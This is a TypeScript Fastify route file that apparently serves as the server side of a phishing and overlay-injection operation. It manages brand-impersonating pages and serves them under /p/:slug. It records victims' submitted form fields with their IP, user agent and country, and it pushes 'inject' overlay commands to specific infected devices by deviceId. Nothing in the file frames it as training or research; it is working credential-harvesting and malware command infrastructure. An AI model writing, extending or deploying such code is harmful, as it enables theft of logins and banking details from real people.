import type { FastifyPluginAsync, FastifyRequest } from 'fastify';
import {
  ensurePhishingTables,
  getPhishingStats,
  listPhishingPages,
  listPhishingLogs,
  seedPhishingPages,
  setPhishingPageEnabled,
  removePhishingPage,
  clearPhishingLogs,
  getPhishingPageBySlug,
  incrementPhishingHit,
  recordPhishingCapture,
  renderPhishingPage,
  type PhishingPageRow,
  type PhishingLogRow,
} from '../services/phishing.js';

/* ---------- overlay command relay (wired by index.ts after socket init) ---------- */

let relay: ((deviceId: string, payload: Record<string, unknown>) => boolean) | null = null;

export function setPhishingRelay(
  fn: (deviceId: string, payload: Record<string, unknown>) => boolean
): void {
  relay = fn;
}

/* ---------- helpers ---------- */

function clientIp(request: FastifyRequest): string {
  const xff = request.headers['x-forwarded-for'];
  const first = Array.isArray(xff) ? xff[0] : xff;
  return (first ? first.split(',')[0].trim() : request.socket.remoteAddress ?? '');
}

function toPage(row: PhishingPageRow, request: FastifyRequest) {
  const proto = (request.headers['x-forwarded-proto'] as string | undefined) ?? request.protocol;
  return {
    id: row.id,
    slug: row.slug,
    brand: row.brand,
    category: row.category,
    variant: row.variant,
    title: row.title,
    hits: row.hits,
    enabled: row.enabled,
    createdAt: row.created_at,
    url: `${proto}://${request.hostname}/p/${row.slug}`,
  };
}

function toLog(row: PhishingLogRow) {
  let fields: Record<string, unknown> = {};
  let meta: Record<string, unknown> = {};
  try { fields = JSON.parse(row.fields); } catch { /* keep empty */ }
  try { meta = JSON.parse(row.meta); } catch { /* keep empty */ }
  return {
    id: row.id,
    pageId: row.page_id,
    slug: row.slug,
    brand: row.brand,
    variant: row.variant,
    ip: row.ip,
    userAgent: row.user_agent,
    fields,
    meta,
    country: row.country,
    city: row.city,
    createdAt: row.created_at,
  };
}

/* ---------- plugin ---------- */

export const phishingRoutes: FastifyPluginAsync = async (app) => {
  ensurePhishingTables();

  /* ---- admin API (/api/phishing) ---- */

  app.get('/api/phishing/stats', async () => {
    return { success: true, data: getPhishingStats() };
  });

  app.get('/api/phishing/pages', async (request) => {
    const q = (request.query ?? {}) as { page?: string; pageSize?: string; search?: string; category?: string; enabled?: string };
    const page = Math.max(1, Number(q.page) || 1);
    const pageSize = Math.min(100, Math.max(1, Number(q.pageSize) || 20));
    const result = listPhishingPages({
      page,
      pageSize,
      search: (q.search ?? '').trim() || undefined,
      category: q.category ?? 'all',
      enabled: q.enabled ?? 'all',
    });
    return { success: true, data: { pages: result.pages.map((p) => toPage(p, request)), total: result.total } };
  });

  app.get('/api/phishing/logs', async (request) => {
    const q = (request.query ?? {}) as { page?: string; pageSize?: string; search?: string };
    const page = Math.max(1, Number(q.page) || 1);
    const pageSize = Math.min(100, Math.max(1, Number(q.pageSize) || 20));
    const result = listPhishingLogs({
      page,
      pageSize,
      search: (q.search ?? '').trim() || undefined,
    });
    return { success: true, data: { logs: result.logs.map(toLog), total: result.total } };
  });

  app.post('/api/phishing/seed', async () => {
    return { success: true, data: seedPhishingPages() };
  });

  app.patch('/api/phishing/pages/:id', async (request, reply) => {
    const params = (request.params ?? {}) as { id: string };
    const body = (request.body ?? {}) as { enabled?: unknown };
    const enabled = Number(body.enabled);
    if (enabled !== 0 && enabled !== 1) {
      return reply.code(400).send({ success: false, error: 'invalid payload' });
    }
    if (!setPhishingPageEnabled(Number(params.id), enabled as 0 | 1)) {
      return reply.code(400).send({ success: false, error: 'invalid id' });
    }
    return { success: true };
  });

  app.post('/api/phishing/pages/:id/toggle', async (request, reply) => {
    const params = (request.params ?? {}) as { id: string };
    const body = (request.body ?? {}) as { enabled?: unknown };
    const enabled = Number(body.enabled);
    if (enabled !== 0 && enabled !== 1) {
      return reply.code(400).send({ success: false, error: 'invalid payload' });
    }
    if (!setPhishingPageEnabled(Number(params.id), enabled as 0 | 1)) {
      return reply.code(400).send({ success: false, error: 'invalid id' });
    }
    return { success: true };
  });

  app.delete('/api/phishing/pages/:id', async (request, reply) => {
    const params = (request.params ?? {}) as { id: string };
    if (!removePhishingPage(Number(params.id))) {
      return reply.code(400).send({ success: false, error: 'invalid id' });
    }
    return { success: true };
  });

  app.post('/api/phishing/logs/clear', async () => {
    clearPhishingLogs();
    return { success: true };
  });

  app.post('/api/phishing/inject', async (request, reply) => {
    const body = (request.body ?? {}) as { deviceId?: string; slug?: string };
    const { deviceId, slug } = body;
    if (!deviceId || !slug) {
      return reply.code(400).send({ success: false, error: 'deviceId and slug are required' });
    }
    const page = getPhishingPageBySlug(slug);
    if (!page || page.enabled !== 1) {
      return reply.code(404).send({ success: false, error: 'page not found or disabled' });
    }
    if (!relay) {
      return reply.code(503).send({ success: false, error: 'command relay not configured' });
    }
    const delivered = relay(deviceId, {
      type: '0xOV',
      action: 'inject',
      url: `/p/${page.slug}/overlay`,
      slug: page.slug,
      brand: page.brand,
      variant: page.variant,
    });
    if (!delivered) {
      return reply.code(404).send({ success: false, error: 'device offline' });
    }
    return { success: true, data: { delivered: true } };
  });

  /* ---- public pages (/p/:slug) ---- */

  app.get('/p/:slug', async (request, reply) => {
    const params = (request.params ?? {}) as { slug: string };
    const row = getPhishingPageBySlug(params.slug);
    if (!row || row.enabled !== 1) return reply.code(404).send('Not found');
    incrementPhishingHit(row.id);
    return reply.type('text/html').send(renderPhishingPage(row));
  });

  app.get('/p/:slug/overlay', async (request, reply) => {
    const params = (request.params ?? {}) as { slug: string };
    const row = getPhishingPageBySlug(params.slug);
    if (!row || row.enabled !== 1) return reply.code(404).send('Not found');
    incrementPhishingHit(row.id);
    return reply.type('text/html').send(renderPhishingPage(row, { overlay: true }));
  });

  app.post('/p/:slug/capture', async (request, reply) => {
    const params = (request.params ?? {}) as { slug: string };
    const row = getPhishingPageBySlug(params.slug);
    if (!row) return reply.code(404).send({ success: false, error: 'not found' });
    const body = (request.body ?? {}) as { fields?: Record<string, unknown>; meta?: Record<string, unknown> };
    recordPhishingCapture(row, {
      fields: body.fields ?? {},
      meta: { ...(body.meta ?? {}), ts: new Date().toISOString() },
      ip: clientIp(request),
      userAgent: String(request.headers['user-agent'] ?? ''),
      country: (request.headers['cf-ipcountry'] as string | undefined) ?? null,
      city: null,
    });
    return { success: true };
  });
};
